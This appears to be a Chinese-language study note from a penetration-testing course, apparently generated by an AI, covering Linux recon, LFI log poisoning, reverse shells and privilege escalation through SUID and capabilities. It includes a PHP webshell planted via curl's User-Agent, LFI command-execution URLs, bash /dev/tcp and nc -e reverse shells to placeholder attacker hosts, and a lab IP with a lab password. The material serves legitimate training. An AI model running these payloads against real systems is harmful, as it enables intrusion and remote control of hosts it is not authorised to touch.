@@ -1,0 +1,174 @@
+### Linux 滲透測試學習筆記
+
+#### 一、 資訊收集 (Information Gathering)
+
+*   **目標系統資訊**
+    *   **作業系統資訊**: 使用 `cat /proc/version` 或 `uname -a` 找出 Linux 發行版和核心版本，使用 `cat /etc/os-release` 查看更詳細的發行版資訊。
+    *   **主機名稱和網路設定**: 檢查 `/etc/hostname`、`/etc/hosts` 和 `/etc/resolv.conf` 檔案，了解主機名稱和網路配置。
+    *   **硬體資訊**: 使用 `lscpu` 來獲取 CPU 資訊。
+    *   **環境變數**:
+        *   `PATH` 環境變數：使用 `echo $PATH` 檢查是否有可寫入的目錄，攻擊者可能會在這些目錄中放入惡意程式碼。
+        *   其他環境變數：使用 `env` 或 `set` 檢視所有環境變數，可能會找到敏感資訊如密碼或 API 金鑰。
+    *   **核心和安全機制**:
+        *   檢查核心版本是否有已知的安全漏洞。
+        *   使用 `sestatus` 檢查 SELinux 的啟用狀態。
+*   **使用者和群組**
+    *   **目前使用者**: 使用 `whoami` 可以顯示目前的使用者名稱。
+    *   **群組資訊**: 使用 `groups $USER` 可以列出使用者所屬的群組。
+*   **網路服務**
+    *   使用 `netstat -punta` 或 `ss -tulpn` 檢查開放的網路連接埠和相關服務。
+    *   檢查是否有不安全的網路服務正在執行，例如沒有密碼保護的 NFS 掛載點。
+*   **其他**
+    *   檢查是否有可利用的 capabilities：使用 `getcap -r / 2>/dev/null` 來檢查系統中設定的 capabilities。
+    *   檢查是否有弱密碼或是預設密碼。
+    *   檢查是否有敏感資訊洩漏在設定檔或是日誌中。
+    *   檢查是否有可利用的排程任務。
+    *   使用 `strings /dev/mem` 或其他記憶體轉儲工具檢視記憶體中的敏感資訊。
+*   **實務經驗**
+    *   資安公司通常會自己培養人才，並更了解台灣工程師的路徑取名習慣。
+    *   例如，使用注音或測試網頁的名稱命名，密碼字典檔的命名方式。
+    *   使用 `nmap` 掃描目標 IP 以獲取開放埠和服務版本資訊。
+    *   使用 `curl` 與目標網頁互動.
+    *   使用 `dirsearch` 來發現網頁上的隱藏目錄和檔案.
+
+#### 二、 尋找弱點 (Vulnerability Scanning)
+
+*   **SUID/SGID 檔案**: 使用 `find / -perm -4000 -ls` 找出 SUID 檔案，或使用 `find / -perm -2000 -ls` 找出 SGID 檔案。這些檔案在執行時會使用擁有者的權限，可能被濫用來提升權限。
+*   **可寫入的檔案和目錄**: 使用 `find / -writable -type d -ls` 或 `find / -perm -o=w -type d -ls` 找出可寫入的目錄。檢查是否有任何可寫入的設定檔，例如 `.bashrc`、`.zshrc` 或 `/etc/ld.so.preload`。
+*   **不安全的 D-Bus 配置**: 使用 `busctl list` 列出所有 D-Bus 服務，並檢查是否有不安全的配置。檢查 `/etc/dbus-1/` 目錄下的設定檔。
+*   **sudo 配置**: 使用 `sudo -l` 檢查目前使用者可以執行的 sudo 命令。
+*   **Docker 設定**: 檢查是否有可寫入的 Docker socket，或不安全的 Docker 容器配置。
+*   **LFI (Local File Inclusion)**:  
+    *   利用程式碼的漏洞，讀取伺服器上的檔案。
+    *   例如讀取 `/etc/passwd`, `/root`, `/home/msiuser` 等檔案。
+    *   讀取 apache 的 log 檔案如 `access.log` 和 `error.log`.
+*   **目錄遍歷/目錄穿越**:
+    *   利用程式碼或伺服器設定的漏洞，跳脫原本期望的資料夾，例如 `../.../../../../etc/passwd`.
+
+#### 三、 利用弱點 (Exploitation)
+
+*   **核心漏洞利用**: 如果發現核心存在漏洞，可以嘗試使用網路上找到的相關 Exploit。
+*   **SUID/SGID 利用**: 如果找到可利用的 SUID/SGID 檔案，可以嘗試執行這些檔案來提升權限。
+*   **可寫入的檔案利用**:
+    *   如果可以寫入 `.bashrc` 或 `.zshrc`，可以修改這些檔案，在下次登入時執行惡意指令。
+    *   如果可以寫入 `/etc/ld.so.preload`，可以讓惡意程式碼在程式啟動時被載入執行。
+*   **D-Bus 利用**: 如果 D-Bus 配置不當，可以透過 D-Bus 來呼叫特權方法，並提升權限。
+*   **sudo 利用**: 如果 sudo 配置不當，可以使用 sudo 命令來執行需要 root 權限的指令。
+*   **網路服務利用**: 如果發現不安全的網路服務，可以嘗試利用這些服務的漏洞來執行惡意程式碼。
+*   **LFI 漏洞利用**
+    *   **寫入 Webshell**:
+        *   透過 User-Agent 寫入 PHP 程式碼到 log 檔案中。
+        *   例如: `curl -A "<?php system(\$_GET['cmd']);?>" http://<靶機IP>`。
+        *   PHP 引擎會解析並執行包含 PHP 標籤的程式碼，即使檔案副檔名不是 `.php`。
+    *   **執行 Webshell**:
+        *   透過 LFI 讀取包含惡意 PHP 程式碼的 log 檔案，並執行其中的命令。
+        *   例如: `http://localhost:5555/index.php?page=/var/log/apache2/access.log&cmd=id`.
+*   **反向 Shell (Reverse Shell)**:
+    *   **目的**: 在目標端開啟一個 Socket，連線到攻擊者的電腦 (Listener)，並將該 Socket 與系統 shell 連接.
+    *   **常見方法**:
+        *   **Bash**: 使用 Bash 內建的 `/dev/tcp` 機制或管線，例如 `bash -i >& /dev/tcp/攻擊者IP/攻擊者port 0>&1`。
+        *   **Netcat (nc)**:
+            *   使用 `-e` 參數直接執行程式，例如 `nc -e /bin/bash 攻擊者IP 攻擊者port` 或使用 `mkfifo` 建立命名管道來實現雙向通訊.
+        *   **Python**: 使用 Python 程式碼建立 socket 連線.
+        *   **PHP**: 使用 `system()`、`exec()` 或其他函式執行系統命令.
+        *   **其他工具**: `socat`, `telnet`, `curl`, `sqlite3` 等也可以用來建立反向連線.
+    *   **編碼**:
+        *   在 URL 中包含特殊字元時，需要進行正確的編碼.
+        *   可以使用 `urlencode` 方式處理 URL 編碼.
+        *   可以使用 `jq` 或 `--data-urlencode` 進行 URL 編碼.
+    *   **注意事項**:
+        *   確認目標端口是否已開啟監聽.
+        *   根據目標系統能用的語言和工具選擇合適的反向 shell 方法.
+    * **範例指令**:
+       *   `curl "http://localhost:5555/index.php?page=../../../var/log/apache2/access.log&cmd=$(echo 'bash -c "bash -i >& /dev/tcp/localhost/4455 0>&1"' | jq -sRr @uri)"`
+       *   `curl -G --data-urlencode "page=../../../var/log/apache2/access.log" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/localhost/4455 0>&1'" http://localhost:5555/index.php`
+       *   `curl 'http://靶機IP/index.php?page=../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/KALIIP/4455%200%3E%261%22'`
+
+#### 四、 權限提升 (Privilege Escalation)
+
+*   **Capabilities**:
+    *   **概念**: Linux 提供的一種更細粒度的權限機制，允許程式在沒有 root 權限的情況下執行特定的特權操作。
+    *   **常見 Capabilities**:
+        *   `CAP_NET_BIND_SERVICE`: 允許非 root 使用者綁定低階通訊埠 (小於 1024).
+        *   `CAP_NET_RAW`: 允許使用 Raw Socket 或封包撈取.
+        *   `CAP_DAC_READ_SEARCH`, `CAP_DAC_OVERRIDE`: 允許讀取/備份系統內所有檔案.
+        *   `CAP_CHOWN`, `CAP_SETUID`, `CAP_SETGID`: 允許讀寫檔案屬性、擁有者，或改變使用者/群組 ID.
+        *   `CAP_SYS_ADMIN`: 允許掛載檔案系統、管理系統資源，風險極高，幾乎被視為「半個 root 權限」.
+        *   `CAP_SYS_MODULE`: 允許安裝/移除 Kernel Module, 載入惡意模組可能完全控制整個系統.
+        *   `CAP_SYS_TIME`: 允許調整系統時間、時區.
+        *   `CAP_SYS_PTRACE`: 允許 debug /偵錯 (ptrace).
+    *   **風險**:
+        *   如果程式本身存在任意程式碼執行或 RCE 漏洞，攻擊者可利用該程式對外提供服務的機制，進一步操作該 Capability.
+        *   不當配置 capabilities 可能導致安全風險.
+        *  `CAP_SYS_ADMIN` 幾乎等同於 root 權限，可能導致容器逃逸.
+    *   **利用**:
+        *   使用 `getcap -r / 2>/dev/null` 來檢查系統中設定的 capabilities.
+        *   若程式具備 `CAP_SETUID`，則有可能將程式的 UID 設定為 0.
+*   **SUID/SGID**:
+    *   **概念**: SUID/SGID 檔案在執行時會使用擁有者的權限.
+    *   **利用**: 若 SUID/SGID 的擁有者是 root，則執行時程式的 EUID 會變成 root (0)，藉此提升權限.
+    *   **例如**: `gdb` 可以利用來取得 root 權限.
+    *   **GTFOBins**: 網站提供了許多可被濫用以提升權限的 SUID/SGID 程式.
+*   **`cap_test` 程式**:
+    *   **目的**: `cap_test` 程式示範了如何使用 capabilities 來暫時取得 root 權限.
+    *   **實作**: 程式碼中呼叫了 `setuid(0)` 和 `setgid(0)`，將真實和有效的使用者 ID 都設為 0.
+    *   **逆向工程**: 可以使用 `gdb` 來分析 `cap_test` 的程式碼邏輯.
+*   **GDB 的使用**:
+    *   **進入 GDB**: `gdb /usr/local/bin/cap_test`.
+    *   **查看檔案資訊**: `info file`.
+    *   **查看可用函式**: `info functions`.
+    *   **組語檢視**: `disassemble main` 或 `disassemble <位址範圍>`.
+    *   **設定斷點**: `break *0x4005b0` 或 `break main`.
+    *   **執行**: `run`.
+    *   **單步執行**: `stepi` (進入子程式) 或 `nexti` (略過子程式).
+    *   **查看暫存器**: `info registers`.
+    *   **查看記憶體**: `x/10x 0x7fffffffe000`.
+    *   **搜尋字串**: `find <start_addr>, <end_addr>, "要搜尋的字串"`.
+    *   **跳過部分執行**: `set $rip`.
+    *   **其他指令**: `info proc mappings`, `info sharedlibrary`, `break system`.
+*   **理解 UID、EUID、RUID、SUID 的差異**:
+    *   **Real User ID (RUID, uid)**: 真實使用者 ID，代表「你本來是誰」.
+    *   **Effective User ID (EUID, euid)**: 有效使用者 ID，決定程式在核心中的權限，大多數特權動作看 EUID 是否為 0.
+    *   **Saved User ID (SUID, suid)**: 為了配合 SUID 程式而多出來的機制，可以暫時/動態調整有效身分.
+    *   **SUID 的影響**: SUID 程式可能導致 EUID=0，但 RUID 仍為原使用者 ID.
+    *   **Capabilities 的影響**: 具備 `CAP_SETUID` 的程式，可以將 RUID 和 EUID 都設為 0.
+    *   **結論**: 只要 EUID=0，幾乎可以做絕大部分 root 能做的事.
+
+#### 五、 常用工具 (Tools)
+
+*   **LinPEAS**: 權限提升掃描工具，可自動掃描系統中的弱點，並提供詳細報告.
+*   **LinEnum, Enumy, unix-privesc-check, linuxprivchecker.py**: 其他權限提升掃描工具.
+*   **Metasploit**: 可利用 `local_exploit_suggester` 模組來尋找可利用的漏洞.
+*   **Kernelpop**: 可以找出核心中的漏洞.
+*   **dirsearch**: 用於網頁目錄和檔案發現的工具.
+*   **nmap**: 用於網路掃描和埠分析的工具.
+*   **curl**: 用於發送 HTTP 請求和測試網頁的工具.
+
+#### 六、 實務操作 (Lab)
+
+*   **靶機環境**
+    *   靶機 IP：`104.155.237.110:5000`.
+    *   每次登入都要重新註冊.
+    *   實驗密碼：`cap2025`.
+*   **基本流程**
+    *   使用 MobaXterm 或 Putty 連接 KALI.
+    *   使用 `ssh root@104.155.237.110 -p <PORT>` 進入 KALI.
+    *   使用 `nmap` 掃描目標 IP.
+    *   使用 `curl` 訪問網頁.
+    *   利用 LFI 漏洞讀取 log.
+    *   寫入 Webshell 並執行命令.
+    *   透過 reverse shell 取得控制權.
+    *   使用 `linpeas.sh` 或其他工具掃描弱點.
+    *   檢查 SUID/SGID 檔案和 capabilities.
+    *   使用 `gdb` 分析程式.
+    *   利用提權方法取得 root 權限.
+    *   讀取 flag 檔案 (`proof.txt`, `root.txt`).
+
+#### 七、 總結
+
+*   滲透測試是一個循序漸進的過程，從資訊收集到權限提升，每個環節都非常重要。
+*   理解 Linux 權限機制 (如 SUID, Capabilities) 是提權的關鍵。
+*   熟悉常用工具和指令，可以提高滲透測試的效率。
+*   實務操作中，多嘗試不同的方法和技巧，才能更深入的理解滲透測試。
+
+希望這個筆記對您有所幫助。請隨時提出問題，我會盡力協助您。
